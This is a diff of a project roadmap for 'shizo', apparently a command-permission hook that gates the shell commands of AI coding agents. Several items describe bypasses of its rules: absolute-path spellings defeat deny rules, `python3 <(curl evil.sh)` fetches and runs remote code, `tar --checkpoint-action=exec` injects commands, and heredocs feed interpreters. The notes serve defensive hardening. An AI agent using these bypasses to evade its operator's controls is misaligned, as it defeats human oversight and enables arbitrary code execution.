@@ -1,12 +1,14 @@
 - [Root detection and denial under `sandbox nono`](plans/drafts/PLAN-root-detection.md)
+- [**Security:** rule matching compares `argv[0]` as written, so every deny rule in the shipped starter file is bypassable by spelling the absolute path (`/usr/bin/python3` vs `python3`). Normalize the command token against the resolved path.](plans/drafts/PLAN-rule-basename-match.md)
 - Find alpha tester?
 - [Allow `trust` in project config to add project-specific binaries](plans/drafts/PLAN-project-trust.md)
 - [A proper language server](plans/drafts/PLAN-language-server.md)
-- Install docs with `make install` and `shizo docs` (or similar) to view them locally
+- [`shizo docs` subcommand — embedded doc viewer](plans/drafts/PLAN-docs-subcommand.md)
 - Expand to other harnesses (see [pretooluse-hook-equivalents research](docs/research/pretooluse-hook-equivalents.md))
-- Add `shizo install claude-hook`
+- [Add `shizo install claude-hook` to add PreToolUse hook. Flags: `--project` for `.claude/settings.json`, `--local` for `.claude/settings.local.json`, `--global` for `~/.claude/settings.json`, defaults to `--project`.](plans/drafts/PLAN-install-claude-hook.md)
 - [Rename `shizo claude-hook` to `shizo hook pretooluse` to make it harness agnostic](plans/drafts/PLAN-rename-hook-pretooluse.md)
-- Add `shizo info` command to retrieve information like `--global-rules-path` or `--attestation-dir`.
-- Add setting to deny stdin redirection at the AST level. shizo already parses the shell AST; it could detect heredocs (<<) and stdin pipes (|) feeding an interpreter and force those to ask or deny even if the base command is allowed. This narrows the attack surface without a blanket interpreter ban.
-- Add support to deny `tar --checkpoint-action=exec=CMD` with a rule `deny tar HAS --checkpoint-action=exec` or similar. This is a known attack vector for shell injection.
-- Add a `ask` rule to enforce something like `rm -rf` to always asked the operator, even if the base command is allowed.
+- [Add `shizo info` command to retrieve information like `--global-rules-path` or `--attestation-dir`.](plans/drafts/PLAN-info-subcommand.md)
+- [Add setting to deny stdin redirection at the AST level. shizo already parses the shell AST; it could detect heredocs (<<) and stdin pipes (|) feeding an interpreter and force those to ask or deny even if the base command is allowed. This narrows the attack surface without a blanket interpreter ban.](plans/drafts/PLAN-stdin-gate.md)
+- [Add support to deny `tar --checkpoint-action=exec=CMD` with a rule `deny tar HAS --checkpoint-action=exec` or similar. This is a known attack vector for shell injection.](plans/drafts/PLAN-has-value-prefix.md)
+- [Add an `ask` rule to force operator prompting (e.g. `rm -rf`), even in automode](plans/drafts/PLAN-ask-rule.md)
+- **Security:** `ANY`/`HAS` silently match the `<subst>` placeholder, so `allow python3 ANY` also allows `python3 <(curl evil.sh)` — the interpreter runs content from a path shizo cannot see. The inner command is rule-checked separately, so exploiting it needs both halves allowed. Consider requiring a rule to spell `<subst>` to accept an opaque token.
